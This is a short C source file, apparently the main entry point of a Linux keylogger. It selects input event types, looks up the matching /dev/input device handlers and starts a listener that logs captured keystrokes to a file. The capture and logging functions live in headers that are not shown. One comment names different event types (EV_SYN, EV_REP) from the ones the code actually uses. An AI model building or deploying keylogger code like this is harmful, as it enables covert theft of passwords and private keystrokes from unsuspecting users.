#include <stdlib.h>
#include <linux/input-event-codes.h>
#include <linux/input.h>

#include "include/proc_bus_input_devices/proc_bus_input_device_processor.h"
#include "include/dev_input_events/dev_input_events_listener.h"
#include "include/keylogger.h"

int main() {

    // Define the event types to listen for.
    // EV_SYN is used to synchronize events, EV_KEY is used for key events, and EV_REP is used for repeat events.
    int eventTypes[] = {EV_KEY, EV_REL, EV_ABS};

    // Get the event handlers for the specified event types
    char *eventHandlers = getInputDeviceEventHandlers(eventTypes, 3);

    // Listen for input events and log the key to a file
    // The logKeyFromInputEventToFile callback function logs keys to a file
    // @see ProcessEventCallback at /include/dev_input_events/dev_input_events_listener.h
    listen_dev_input_events(eventHandlers, logKeyFromInputEventToFile);

    return EXIT_SUCCESS;
}